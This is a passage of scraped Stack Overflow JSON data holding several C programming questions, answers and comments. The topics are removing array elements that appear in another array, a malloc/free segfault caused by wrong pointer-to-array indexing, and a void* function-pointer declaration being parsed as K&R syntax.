try and avoid a slow element-by-element copying procedure but it doesn't seem to work for me. Effectively what I'm trying to make happen is for every element of array point to the corresponding element in array_new but I can't work out how to make the pointers do that.</p>\n\n<p>Any help would be much appreciated!</p>\n"}, {"tags": ["c", "arrays", "removeall"], "comments": [{"owner": {"reputation": 657, "user_id": 5440452, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/609964d12cea609c4df487ccd4ae1f73?s=128&d=identicon&r=PG&f=1", "display_name": "hexasoft", "link": "https://stackoverflow.com/users/5440452/hexasoft"}, "edited": false, "score": 0, "creation_date": 1447277173, "post_id": 33660048, "comment_id": 55093858, "body": "You know how to delete from a list? So you loop into <code>list2</code> and ask to delete the elements from <code>list1</code>."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1447277334, "post_id": 33660048, "comment_id": 55093933, "body": "Please give a fuller code example to show what <code>A, B, ..</code> mean, and why you use a double <code>**</code>. <i>&quot;I had developed a solution myself&quot;</i> was the problem &quot;too many loops&quot; or not working? Please post some proper code that demonstrates your problem."}], "answers": [{"comments": [{"owner": {"reputation": 325, "user_id": 2392955, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/HWXni.jpg?s=128&g=1", "display_name": "Ricardo", "link": "https://stackoverflow.com/users/2392955/ricardo"}, "edited": false, "score": 0, "creation_date": 1447324655, "post_id": 33660511, "comment_id": 55111878, "body": "The order in list A can indeed not be disturbed. In step 2 I assume you shift the remaining elements  on the go and realloc once at the end?"}], "tags": [], "owner": {"reputation": 586, "user_id": 2426755, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9123c2aef4f846cba874e400bfe3691f?s=128&d=identicon&r=PG", "display_name": "Kang Li", "link": "https://stackoverflow.com/users/2426755/kang-li"}, "is_accepted": false, "score": 1, "last_activity_date": 1447278712, "creation_date": 1447278712, "answer_id": 33660511, "question_id": 33660048, "link": "https://stackoverflow.com/questions/33660048/how-to-delete-all-elements-from-list-a-which-are-also-in-list-b/33660511#33660511", "title": "How to delete all elements from list A which are also in list B?", "body": "<p>I can gave you n*log(n) solution, but this requires the objects are sortable.</p>\n\n<ol>\n<li>sort the two list of object. //n*log(n)</li>\n<li>go through list B, if elements B[i] existed in list A, remove it, this could be done in one loop.</li>\n<li>If you want keep the origin order of list A, you need remove the matched items from origin list A directly.</li>\n</ol>\n"}], "owner": {"reputation": 325, "user_id": 2392955, "user_type": "registered", "accept_rate": 73, "profile_image": "https://i.stack.imgur.com/HWXni.jpg?s=128&g=1", "display_name": "Ricardo", "link": "https://stackoverflow.com/users/2392955/ricardo"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 56, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1447278712, "creation_date": 1447276698, "question_id": 33660048, "link": "https://stackoverflow.com/questions/33660048/how-to-delete-all-elements-from-list-a-which-are-also-in-list-b", "title": "How to delete all elements from list A which are also in list B?", "body": "<p>I'm looking for a removeAll equivalent for C.</p>\n\n<p>I'll clarify my question with a simple example.</p>\n\n<p>I have a list of structs type Element.</p>\n\n<pre><code>Element** list1 = {A, B, C, D, E F}\n</code></pre>\n\n<p>There is also a second list</p>\n\n<pre><code>Element** list2 = {B, E}\n</code></pre>\n\n<p>Now I want to delete all elements from list1 which are also contained in list2.\nI also want my list1 to be reallocated.</p>\n\n<p>The resulting list contains elements {A, C, D, F}.</p>\n\n<p>The used datastructure has to be an array since I want to look up elements on index very fast.</p>\n\n<p>I had developed a solution myself. Unfortunately I needed too much loops.</p>\n"}, {"tags": ["c", "pointers", "memory-management", "segmentation-fault", "malloc"], "comments": [{"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 3, "creation_date": 1447276808, "post_id": 33659971, "comment_id": 55093669, "body": "<code>int *ptrArr[5]</code> is declaring array of 5 pointers."}, {"owner": {"reputation": 3134, "user_id": 5475209, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/QRBxV.jpg?s=128&g=1", "display_name": "terence hill", "link": "https://stackoverflow.com/users/5475209/terence-hill"}, "edited": false, "score": 0, "creation_date": 1447277397, "post_id": 33659971, "comment_id": 55093966, "body": "I don&#39;t think that the first code works. Try it with a size bigger then 5, maybe 10000"}], "answers": [{"tags": [], "owner": {"reputation": 2387, "user_id": 3818191, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/aca92340c2b2e2bb08aeb1441914e929?s=128&d=identicon&r=PG&f=1", "display_name": "JCx", "link": "https://stackoverflow.com/users/3818191/jcx"}, "is_accepted": false, "score": 0, "last_activity_date": 1447279102, "last_edit_date": 1495541741, "creation_date": 1447278565, "answer_id": 33660482, "question_id": 33659971, "link": "https://stackoverflow.com/questions/33659971/mallocing-arrays-and-then-freeing-them/33660482#33660482", "title": "Malloc&#39;ing Arrays and then Free&#39;ing them?", "body": "<p>Well that was a headache to decode, but like a good cryptic crossword, there's a solution.  I've tidied things up a bit.  The fundamental problem was the dereferencing. </p>\n\n<p>See:\n<a href=\"https://stackoverflow.com/questions/3552844/order-of-operations-for-dereference-and-bracket-ref-in-c\">Order of operations for dereference and bracket-ref in C</a></p>\n\n<p>I've marked the line in some working code below.  I've added brackets around the (*ptrArr[i]) to obtain the array, that can then be correctly indexed as (*ptrArr[i])[j]. </p>\n\n<p>I've also suggested an alternative way of declaring the array in the first place.  One that's easier to verify!</p>\n\n<pre><code>#include &lt;stdlib.h&gt;\n#include &lt;stdio.h&gt;\n\n#define SIZE 5 \n\nint main()\n{\n    // This makes things clearer :-\n    typedef int ArrayType[SIZE];\n    typedef ArrayType * ArrayPtr;\n    ArrayPtr ptrArr[SIZE];\n\n    for (int i = 0; i &lt; SIZE; i++)\n        ptrArr[i] = malloc (sizeof (int) * SIZE);\n\n    int loop = SIZE;\n\n    for (int i = 0; i &lt; SIZE; i++)\n    {\n        for (int j = 0; j &lt; SIZE; j++)\n        {\n            // THIS NEXT LINE HAD THE WRONG BRACKETS IN\n            // *(ptrArr[i])[j] = (loop + (i * j));\n            (*ptrArr[i])[j] = (loop + (i * j));\n            printf(\"array has base address: %lx\\n\", ptrArr[i]); \n            printf(\"writing to: %lx\\n\", &amp;(*ptrArr[i])[j]); \n            ++loop;\n        }\n    }\n\n    for (int i = SIZE-1; i &gt;= 0; i--)\n    {\n        printf (\"Freeing ptrArr[%x] with address %lx\\n\", i, ptrArr[i]);\n        free (ptrArr[i]);\n    }\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 165655, "user_id": 721269, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/346ca03edfbde2a468adc289867ab975?s=128&d=identicon&r=PG", "display_name": "David Schwartz", "link": "https://stackoverflow.com/users/721269/david-schwartz"}, "is_accepted": false, "score": 0, "last_activity_date": 1447278581, "creation_date": 1447278581, "answer_id": 33660485, "question_id": 33659971, "link": "https://stackoverflow.com/questions/33659971/mallocing-arrays-and-then-freeing-them/33660485#33660485", "title": "Malloc&#39;ing Arrays and then Free&#39;ing them?", "body": "<pre><code>for(int i=0; i&lt;5; i++)\n    ptrArr[i] = malloc(sizeof(int) * 5);\n</code></pre>\n\n<p>This says that <code>ptrArr[i]</code> is a pointer to some integers.</p>\n\n<pre><code>    *ptrArr[i][j] = (loop + (i*j));\n</code></pre>\n\n<p>This says that <code>ptrArr[i][j]</code> is a pointer to an integer.</p>\n\n<p>Which is it? These two pieces of code differ in the number of layers of indirection.</p>\n"}, {"tags": [], "owner": {"reputation": 5077, "user_id": 2327831, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/acb1ec5c15fa33042fa79847c55da18d?s=128&d=identicon&r=PG", "display_name": "this", "link": "https://stackoverflow.com/users/2327831/this"}, "is_accepted": false, "score": 0, "last_activity_date": 1447279515, "last_edit_date": 1447279515, "creation_date": 1447279199, "answer_id": 33660663, "question_id": 33659971, "link": "https://stackoverflow.com/questions/33659971/mallocing-arrays-and-then-freeing-them/33660663#33660663", "title": "Malloc&#39;ing Arrays and then Free&#39;ing them?", "body": "<p>Your first example is not correct, because you are printing the incorrect array indexes. </p>\n\n<p>The nested for loop calls this:</p>\n\n<pre><code>printf(\"[%x](%2d) | \", &amp;*ptrArr[i][j], *ptrArr[i][j]); \n</code></pre>\n\n<p>The third parameter is identical to <code>ptrArr[i][j][0]</code>. </p>\n\n<p>But that is incorrect. It should be <code>ptrArr[i][0][j]</code> because you allocated only one inner dimension of your 2d array with the malloc call: <code>ptrArr[i] = malloc(sizeof(int) * 5);</code>.</p>\n\n<p>You see <code>int (*ptrArr[5])[5];</code> is really an array of pointers to an array of 5 ints. And <code>ptrArr[i]</code> is a pointer to an array of 5 ints.</p>\n\n<p>This also means that the second parameter, <code>&amp;*ptrArr[i][j]</code>, which is identical to <code>ptrArr[i][j]</code> should really be <code>ptrArr[i][0]</code>, because again, we only have one dimension allocated.</p>\n\n<p>...</p>\n\n<p>We're almost done. First replace the malloc call with calloc, so we won't print garbage values. Then replace %x printf specifiers with %p and cast their respective parameters to (void*).</p>\n\n<p>With those corrections in place, the first example prints out the correct addresses and correct values, and doesn't have undefined behavior.(You can also remove redundant <code>&amp;*</code> pairs)</p>\n\n<p>(This has been just a fix for your first example! I haven't even addressed the second one. But the solution is mostly the same. )</p>\n"}, {"tags": [], "owner": {"reputation": 31945, "user_id": 3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "is_accepted": true, "score": 2, "last_activity_date": 1447281540, "creation_date": 1447281540, "answer_id": 33661204, "question_id": 33659971, "link": "https://stackoverflow.com/questions/33659971/mallocing-arrays-and-then-freeing-them/33661204#33661204", "title": "Malloc&#39;ing Arrays and then Free&#39;ing them?", "body": "<p>The way I approach this type of problem is to print out the <code>sizeof</code> the various suspects, like this</p>\n\n<pre><code>int (*test[5])[5];\n\nprintf( \"%zu \", sizeof(test) );\nprintf( \"%zu \", sizeof(test[0]) );\nprintf( \"%zu\\n\", sizeof(test[0][0]) );\n</code></pre>\n\n<p>The result is <code>40 8 20</code>. (Note that on my machine an <code>int</code> is 4 bytes and a pointer is 8 bytes.)<br>\nSo that tells me that <code>test</code> is an array of 5 pointers. It logically follows that <code>test[0]</code> is a single pointer. But what's interesting is that <code>test[0][0]</code> is an array of 5 ints.</p>\n\n<p>If I add the following line of code</p>\n\n<pre><code>printf( \"%zu\\n\", sizeof(test[0][0][0]) );\n</code></pre>\n\n<p>the output is 4, i.e. <code>test[0][0][0]</code> is a single <code>int</code>. From that we conclude that the declaration <code>int (*test[5])[5]</code> is declaring a three dimensional array, which is not what you intended.</p>\n\n<hr>\n\n<p>So let's try a simpler declaration, like this</p>\n\n<pre><code>int (*test)[5];\n\nprintf( \"%zu \", sizeof(test) );\nprintf( \"%zu \", sizeof(test[0]) );\nprintf( \"%zu\\n\", sizeof(test[0][0]) );\n</code></pre>\n\n<p>The output is <code>8 20 4</code>, which is to say that <code>test</code> is a single pointer, <code>test[0]</code> is an array of 5 ints, and <code>test[0][0]</code> is a single <code>int</code>. We conclude that <code>int (*test)[5]</code> declares a two dimensional array.</p>\n\n<hr>\n\n<p>The next question is how to we allocate memory for the array. If we do this</p>\n\n<pre><code>test = malloc( 5 * sizeof(int) );\n</code></pre>\n\n<p>then we have an array that has 1 row and 5 columns, basically a one-dimensional array.  </p>\n\n<p>To get a two-dimensional array with <code>N</code> rows, we need</p>\n\n<pre><code>test = malloc( N * 5 * sizeof(int) );\n</code></pre>\n\n<p>Then we can fill, print, and free the array like this</p>\n\n<pre><code>int N = 5;\nfor ( int row = 0; row &lt; N; row++ )\n    for ( int col = 0; col &lt; 5; col++ )\n        test[row][col] = (row+5)*10 + col;\n\nfor ( int row = 0; row &lt; N; row++ )\n{\n    for ( int col = 0; col &lt; 5; col++ )\n        printf( \"%2d \", test[row][col] );\n    printf( \"\\n\" );\n}\n\nfree( test );\n</code></pre>\n"}], "owner": {"reputation": 53, "user_id": 5552219, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/r6D25.jpg?s=128&g=1", "display_name": "T.Goodall", "link": "https://stackoverflow.com/users/5552219/t-goodall"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 160, "favorite_count": 0, "accepted_answer_id": 33661204, "answer_count": 4, "score": 5, "last_activity_date": 1447281540, "creation_date": 1447276443, "question_id": 33659971, "link": "https://stackoverflow.com/questions/33659971/mallocing-arrays-and-then-freeing-them", "title": "Malloc&#39;ing Arrays and then Free&#39;ing them?", "body": "<p>I'm currently messing around with c I'm having a few hiccups in the pointer usage and syntax area.</p>\n\n<p>Below, i am (trying) to create an array of pointers to integer arrays, then, direct each pointer to an array created via malloc().</p>\n\n<p>After the arrays have been created i then for loop through each cell, assigning a value.</p>\n\n<p>Now, all of this seems to be working, but when it comes to then using free() to take back the memory, the program crashes.</p>\n\n<p>I have noticed that if i malloc() the array memory and then immediately call free() on them, the program executes without problem. When however I malloc(), assign values and THEN call free() the crash will occur. (Segmentation fault).</p>\n\n<p>Below is the code that works, malloc() then immediately free()ing</p>\n\n<pre><code>int (*ptrArr[5])[5];\n\nfor(int i=0; i&lt;5; i++)\n    ptrArr[i] = malloc(sizeof(int) * 5);\n\nfor(int i=0; i&lt;5; i++)\n    printf(\"ptrArr[%d][%x]-&gt;[%x]\\n\", i, &amp;ptrArr[i], &amp;*ptrArr[i]);\nprintf(\"\\n\");\n\nfor(int i=0; i&lt;5; i++){\n    for(int j=0; j&lt;5; j++){\n        printf(\"[%x](%2d) | \", &amp;*ptrArr[i][j], *ptrArr[i][j]);  \n    }\n    printf(\"\\n\");\n}\n\nfor(int i=4; i&gt;=0; i--)\n    free(ptrArr[i]);\n</code></pre>\n\n<p>the above executes as i expected it to, but when I assign values to cells and then try and call free afterwards, a segmentation fault is generated:</p>\n\n<pre><code>int (*ptrArr[5])[5];\n\nfor(int i=0; i&lt;5; i++)\n    ptrArr[i] = malloc(sizeof(int) * 5);\n\nfor(int i=0; i&lt;5; i++)\n    printf(\"ptrArr[%d][%x]-&gt;[%x]\\n\", i, &amp;ptrArr[i], &amp;*ptrArr[i]);\nprintf(\"\\n\");\n\nfor(int i=0; i&lt;5; i++){\n    for(int j=0; j&lt;5; j++){\n        printf(\"[%x](%2d) | \", &amp;*ptrArr[i][j], *ptrArr[i][j]);  \n    }\n    printf(\"\\n\");\n}\n\nint loop = 5;\nfor(int i=0; i&lt;5; i++){\n    for(int j=0; j&lt;5; j++){\n        *ptrArr[i][j] = (loop + (i*j));\n        ++loop;\n    }\n}\n\nprintf(\"\\n\");\nfor(int i=0; i&lt;5; i++){\n    for(int j=0; j&lt;5; j++){\n        printf(\"[%x](%2d) | \", &amp;*ptrArr[i][j], *ptrArr[i][j]);\n    }\n    printf(\"\\n\");\n}\n\nfor(int i=4; i&gt;=0; i--)\n{\n    printf(\"Freeing ptrArr[%x]\\n\", i);\n    free(ptrArr[i]);\n}\n</code></pre>\n\n<p>I think I'm either misunderstanding the</p>\n\n<pre><code>int (*ptrArr[5])[5];\n</code></pre>\n\n<p>declaration, which I intended was an array of 5 pointers, each pointing to an integer array, or im not assigning values to cells correctly, instead, corrupting memory which causes the free() to fail.</p>\n\n<p>Any help would be appreciated, I hope the question is clear and succinct.</p>\n\n<p>Thanks.</p>\n"}, {"tags": ["c", "powerpc", "codewarrior"], "comments": [{"owner": {"reputation": 199706, "user_id": 1566221, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/ce3ea4ffd1023d4382f397312352726d?s=128&d=identicon&r=PG", "display_name": "rici", "link": "https://stackoverflow.com/users/1566221/rici"}, "edited": false, "score": 1, "creation_date": 1447275294, "post_id": 33659555, "comment_id": 55092878, "body": "What syntax error? Which C compiler / standard? No problems with C99 here: <a href=\"http://ideone.com/6rhO8r\" rel=\"nofollow noreferrer\">ideone.com/6rhO8r</a>"}, {"owner": {"reputation": 456, "user_id": 2574294, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7c48fbc7bf4885000255c2e19de148dc?s=128&d=identicon&r=PG", "display_name": "Rhialto supports Monica", "link": "https://stackoverflow.com/users/2574294/rhialto-supports-monica"}, "reply_to_user": {"reputation": 199706, "user_id": 1566221, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/ce3ea4ffd1023d4382f397312352726d?s=128&d=identicon&r=PG", "display_name": "rici", "link": "https://stackoverflow.com/users/1566221/rici"}, "edited": false, "score": 1, "creation_date": 1447275585, "post_id": 33659555, "comment_id": 55093013, "body": "Of course <code>Circular_Buffer</code> should be defined beforehand, and probably be a pointer. Other than that, I agree with @rici."}, {"owner": {"reputation": 227, "user_id": 1040523, "user_type": "registered", "accept_rate": 47, "profile_image": "https://www.gravatar.com/avatar/8c21f78186362812f2efd5a9057bdd2a?s=128&d=identicon&r=PG", "display_name": "richardnixonthethird", "link": "https://stackoverflow.com/users/1040523/richardnixonthethird"}, "edited": false, "score": 0, "creation_date": 1447275605, "post_id": 33659555, "comment_id": 55093023, "body": "I am using  Minimalist GNU for Windows (mingw32) - C99 extensions are enabled"}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1447275700, "post_id": 33659555, "comment_id": 55093077, "body": "I get similar from MSVC. Having defined <code>U8</code> and <code>BOOL</code> as types, your second <code>struct</code> definition compiles cleanly. I didn&#39;t even need your <code>typedef void* VoidPtr</code>. But your first <code>struct</code> definition, gives <code>error C2122: &#39;void *&#39; : prototype parameter in name list illegal</code>"}, {"owner": {"user_type": "does_not_exist", "display_name": "user824425"}, "edited": false, "score": 0, "creation_date": 1447276278, "post_id": 33659555, "comment_id": 55093391, "body": "I&#39;m unable to reproduce the problem with mingw32 or MSVC 14. Please provide a complete example, because the error isn&#39;t here."}, {"owner": {"user_type": "does_not_exist", "display_name": "user824425"}, "edited": false, "score": 0, "creation_date": 1447276500, "post_id": 33659555, "comment_id": 55093510, "body": "Also, how is the powerpc tag related if you&#39;re using mingw32?"}, {"owner": {"reputation": 199706, "user_id": 1566221, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/ce3ea4ffd1023d4382f397312352726d?s=128&d=identicon&r=PG", "display_name": "rici", "link": "https://stackoverflow.com/users/1566221/rici"}, "reply_to_user": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 4, "creation_date": 1447276702, "post_id": 33659555, "comment_id": 55093607, "body": "@WeatherVane: That&#39;s the result of using K&amp;R C syntax (accidentally); if you don&#39;t define either Circular_Buffer or VoidPtr, then they become argument names with unspecified types."}, {"owner": {"reputation": 31945, "user_id": 3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "reply_to_user": {"reputation": 199706, "user_id": 1566221, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/ce3ea4ffd1023d4382f397312352726d?s=128&d=identicon&r=PG", "display_name": "rici", "link": "https://stackoverflow.com/users/1566221/rici"}, "edited": false, "score": 0, "creation_date": 1447279459, "post_id": 33659555, "comment_id": 55094973, "body": "@rici You win the prize (and should post an answer to claim said prize). OP has finally added the declaration for <code>Circular_Buffer</code>, and it&#39;s just as you suggested."}, {"owner": {"reputation": 227, "user_id": 1040523, "user_type": "registered", "accept_rate": 47, "profile_image": "https://www.gravatar.com/avatar/8c21f78186362812f2efd5a9057bdd2a?s=128&d=identicon&r=PG", "display_name": "richardnixonthethird", "link": "https://stackoverflow.com/users/1040523/richardnixonthethird"}, "reply_to_user": {"reputation": 199706, "user_id": 1566221, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/ce3ea4ffd1023d4382f397312352726d?s=128&d=identicon&r=PG", "display_name": "rici", "link": "https://stackoverflow.com/users/1566221/rici"}, "edited": false, "score": 0, "creation_date": 1447279714, "post_id": 33659555, "comment_id": 55095083, "body": "@rici, Thanks I think you have the right answer. I am just confused as to why it compiled when VoidPtr is defined and Circular_Buffer is not.  Seems like I should get the same error."}, {"owner": {"reputation": 199706, "user_id": 1566221, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/ce3ea4ffd1023d4382f397312352726d?s=128&d=identicon&r=PG", "display_name": "rici", "link": "https://stackoverflow.com/users/1566221/rici"}, "edited": false, "score": 0, "creation_date": 1447282478, "post_id": 33659555, "comment_id": 55096428, "body": "@skipfer0712: Indeed you should. You should need either both or neither to be defined for it to work. (And on even not very recent gcc versions, compiling with <code>-Wall</code> will tell you that you&#39;re using a deprecated function declaration syntax.)"}, {"owner": {"reputation": 199706, "user_id": 1566221, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/ce3ea4ffd1023d4382f397312352726d?s=128&d=identicon&r=PG", "display_name": "rici", "link": "https://stackoverflow.com/users/1566221/rici"}, "reply_to_user": {"reputation": 31945, "user_id": 3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "edited": false, "score": 0, "creation_date": 1447283333, "post_id": 33659555, "comment_id": 55096761, "body": "@user3386109: Yeah, probably. I posted an answer, anyway. I don&#39;t have a good explanation for how it works when VoidPtr is defined, but I don&#39;t have the version of gcc OP is using. Or the one being used by WeatherVane."}], "answers": [{"comments": [{"owner": {"reputation": 31945, "user_id": 3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "edited": false, "score": 1, "creation_date": 1447276068, "post_id": 33659848, "comment_id": 55093269, "body": "Or the problem is with the definition of <code>Circular_Buffer</code>."}, {"owner": {"reputation": 2842, "user_id": 648741, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/47813cc59b0edb414b88601f1defe02a?s=128&d=identicon&r=PG", "display_name": "jochen", "link": "https://stackoverflow.com/users/648741/jochen"}, "edited": false, "score": 2, "creation_date": 1447276281, "post_id": 33659848, "comment_id": 55093392, "body": "Does my code compile for you?  If not, what error message do you get?"}, {"owner": {"reputation": 227, "user_id": 1040523, "user_type": "registered", "accept_rate": 47, "profile_image": "https://www.gravatar.com/avatar/8c21f78186362812f2efd5a9057bdd2a?s=128&d=identicon&r=PG", "display_name": "richardnixonthethird", "link": "https://stackoverflow.com/users/1040523/richardnixonthethird"}, "edited": false, "score": 0, "creation_date": 1447277201, "post_id": 33659848, "comment_id": 55093879, "body": "Your code complied.  Can you see my edit on how I defined Circular_Buffer"}], "tags": [], "owner": {"reputation": 2842, "user_id": 648741, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/47813cc59b0edb414b88601f1defe02a?s=128&d=identicon&r=PG", "display_name": "jochen", "link": "https://stackoverflow.com/users/648741/jochen"}, "is_accepted": false, "score": 0, "last_activity_date": 1447275992, "creation_date": 1447275992, "answer_id": 33659848, "question_id": 33659555, "link": "https://stackoverflow.com/questions/33659555/using-a-void-as-an-argument-inside-a-function-pointer-inside-a-structure-defini/33659848#33659848", "title": "Using a void* as an argument inside a function pointer inside a structure definition causes a syntax error", "body": "<p>The first declaration, with the <code>void *</code>, seems perfectly valid C.  I added some code to make this a complete program:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\ntypedef int U8;\ntypedef int BOOL;\ntypedef int Circular_Buffer;\n\ntypedef struct Circular_Buffer_Interface_t {\n    U8 (*Put)(Circular_Buffer, void*);\n    U8 (*Get)(Circular_Buffer, void*);\n    U8 (*Reset)(Circular_Buffer);\n    BOOL (*isFull)(Circular_Buffer);\n    BOOL (*isEmpty)(Circular_Buffer);\n} Circular_Buffer_Interface_t;\n\nint main() {\n    puts(\"hello\");\n}\n</code></pre>\n\n<p>This program compiles successfully and without warning with GNU C version 5.2 on MacOSX:</p>\n\n<pre><code>&gt; gcc-5 -std=c99 -Wall x.c\n&gt; ./a.out\nhello\n</code></pre>\n\n<p>The same works with the Apple version of clang.  Thus I suspect that the problem is with your C compiler, rather than with your code.</p>\n"}, {"tags": [], "owner": {"reputation": 199706, "user_id": 1566221, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/ce3ea4ffd1023d4382f397312352726d?s=128&d=identicon&r=PG", "display_name": "rici", "link": "https://stackoverflow.com/users/1566221/rici"}, "is_accepted": true, "score": 2, "last_activity_date": 1447283237, "creation_date": 1447283237, "answer_id": 33661545, "question_id": 33659555, "link": "https://stackoverflow.com/questions/33659555/using-a-void-as-an-argument-inside-a-function-pointer-inside-a-structure-defini/33661545#33661545", "title": "Using a void* as an argument inside a function pointer inside a structure definition causes a syntax error", "body": "<p>This member declaration</p>\n\n<pre><code>U8 (*Put)(Circular_Buffer, VoidPtr);\n</code></pre>\n\n<p>will work fine if neither <code>Circular_Buffer</code> nor <code>VoidPtr</code> are defined with  <code>typedef</code> at that point in the source code. (<code>U8</code> must be defined, though.) That's because it will be accepted as a K&amp;R-style function declaration which specifies the names of the parameters but not their types. (That is, <code>Put</code> will be declared as a pointer to a function taking two parameters of unspecified type.)</p>\n\n<p>It will also work if both <code>Circular_Buffer</code> and <code>VoidPtr</code> are defined as <code>typedef</code>s, in which case it will be treated as a normal standard C declaration.</p>\n\n<p>If you compile with <code>-Wall</code>, the first case will probably produce a warning. <code>-Wall</code> is <em>always</em> recommended.</p>\n\n<p>It should fail to compile if only one of the two identifiers is declared as a <code>typedef</code>, so I don't know how it works in the case where <code>typedef void* VoidPtr</code> comes before the member declaration, and <code>typedef struct ... Circular_Buffer</code> comes afterwards. Perhaps that's an obscure feature of an old version of gcc. (Once the compiler decides it is a K&amp;R function declaration, the actual parameter names can be ignored unless the it is a function definition, and in the context in which the line appears, it cannot be a function definition.)</p>\n"}], "owner": {"reputation": 227, "user_id": 1040523, "user_type": "registered", "accept_rate": 47, "profile_image": "https://www.gravatar.com/avatar/8c21f78186362812f2efd5a9057bdd2a?s=128&d=identicon&r=PG", "display_name": "richardnixonthethird", "link": "https://stackoverflow.com/users/1040523/richardnixonthethird"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 332, "favorite_count": 0, "accepted_answer_id": 33661545, "answer_count": 2, "score": 0, "last_activity_date": 1447283237, "creation_date": 1447274911, "last_edit_date": 1447277643, "question_id": 33659555, "link": "https://stackoverflow.com/questions/33659555/using-a-void-as-an-argument-inside-a-function-pointer-inside-a-structure-defini", "title": "Using a void* as an argument inside a function pointer inside a structure definition causes a syntax error", "body": "<p>I am creating an interface structure</p>\n\n<pre><code>typedef struct Circular_Buffer_Interface_t * Circular_Buffer_Interface;\ntypedef struct Circular_Buffer_Interface_t {\n    U8 (*Put)(Circular_Buffer, void*);\n    U8 (*Get)(Circular_Buffer, void*);\n    U8 (*Reset)(Circular_Buffer);\n    BOOL (*isFull)(Circular_Buffer);\n    BOOL (*isEmpty)(Circular_Buffer);\n} Circular_Buffer_Interface_t;\n\ntypedef struct Circular_Buffer_t * Circular_Buffer;\ntypedef struct Circular_Buffer_t {\n    Circular_Buffer_Interface Interface;\n} Circular_Buffer_t;\n</code></pre>\n\n<p>My question is when I try to compile why using void* as a function argument it throws a syntax error.</p>\n\n<p>if I use a typedef\n   <code>typedef void* VoidPtr</code></p>\n\n<p>and then use</p>\n\n<pre><code>typedef void* VoidPtr;\ntypedef struct Circular_Buffer_Interface_t {\n    U8 (*Put)(Circular_Buffer, VoidPtr);\n    U8 (*Get)(Circular_Buffer, VoidPtr);\n    U8 (*Reset)(Circular_Buffer);\n    BOOL (*isFull)(Circular_Buffer);\n    BOOL (*isEmpty)(Circular_Buffer);\n} Circular_Buffer_Interface_t;\n</code></pre>\n\n<p>everything complies just fine.</p>\n\n<p>Does anyone have a clue while this is happening?\nThanks in advance.</p>\n"}, {"tags": ["c", "arrays", "algorithm", "recursion"], "comments": [{"owner": {"reputation": 31945, "user_id": 3386109, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/zt9UL.png?s=128&g=1", "display_name": "user3386109", "link": "https://stackoverflow.com/users/3386109/user3386109"}, "edited": false, "score": 0, "creation_date": 1447274741, "post_id": 33659326, "comment_id": 55092596, "body": "<code>PrintArray(a[],n)</code> should be <code>PrintArray(a,n)</code>. But if you know <code>n</code>, you don&#39;t need recursion to print the array backwards. A simple loop will do. So I think there&#39;s something about the assignment that you didn&#39;t understand."}, {"owner": {"reputation": 12925, "user_id": 4668606, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/V9l7Y.jpg?s=128&g=1", "display_name": "Paul", "link": "https://stackoverflow.com/users/4668606/paul"}, "reply_to_user": {"reputation": 31945, "user_id": 